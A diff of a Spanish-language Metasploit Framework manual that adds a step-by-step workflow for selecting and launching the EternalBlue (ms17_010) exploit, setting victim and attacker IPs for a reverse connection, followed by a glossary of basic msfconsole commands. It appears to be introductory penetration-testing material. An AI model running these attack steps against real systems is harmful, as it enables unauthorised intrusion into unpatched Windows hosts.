@@ -1,23 +1,42 @@
-Conceptos Básicos
-msfconsole: La interfaz de línea de comandos principal.
+# 💣 Manual de Uso: Metasploit Framework
 
-Módulos:
+> La plataforma de pruebas de penetración más utilizada del mundo.
 
-exploit: Código que aprovecha una vulnerabilidad.
+### 💻 Flujo de Trabajo (Ejemplo Real)
 
-payload: El código que se ejecuta en el objetivo tras el exploit (ej. una reverse shell).
+```bash
+# 1. Iniciar la consola
+msfconsole
 
-auxiliary: Escáneres, fuzzers y herramientas de recolección de datos.
+# 2. Buscar un exploit (ej: eternalblue)
+msf6 > search eternalblue
 
-post: Módulos para después de comprometer el sistema (escalada de privilegios).
+# 3. Seleccionar el módulo
+msf6 > use exploit/windows/smb/ms17_010_eternalblue
 
-Comandos Esenciales
-Bash
+# 4. Ver qué requisitos pide el exploit
+msf6 > show options
 
-msfconsole                     # Iniciar Metasploit
-search [nombre]                # Buscar un exploit o módulo
-use [ruta_del_modulo]          # Seleccionar un módulo
-show options                   # Ver qué datos necesita el exploit
-set RHOSTS [IP_objetivo]       # Configurar la IP de la víctima
-set LHOST [Tu_IP]              # Configurar tu IP para la conexión reversa
-exploit                        # Lanzar el ataque (o 'run' para auxiliares)
+# 5. Configurar el objetivo (Víctima) y atacante (Tú)
+msf6 > set RHOSTS 192.168.1.50
+msf6 > set LHOST 192.168.1.10
+
+# 6. Ejecutar el ataque
+msf6 > exploit
+
+
+msfconsole : Inicia la interfaz principal de línea de comandos.
+
+search [nombre] : Busca exploits, auxiliares o módulos por palabras clave.
+
+use [ruta] : Selecciona y carga un módulo específico para usarlo.
+
+show options : Muestra la tabla de configuración necesaria (puertos, IPs, etc.).
+
+set RHOSTS [IP] : Configura la IP del Remote Host (la Víctima).
+
+set LHOST [IP] : Configura la IP del Local Host (Tú) para recibir la conexión inversa.
+
+exploit : Lanza el ataque (usado principalmente en exploits).
+
+run : Sinónimo de exploit, usado comúnmente en módulos auxiliary (escáneres).
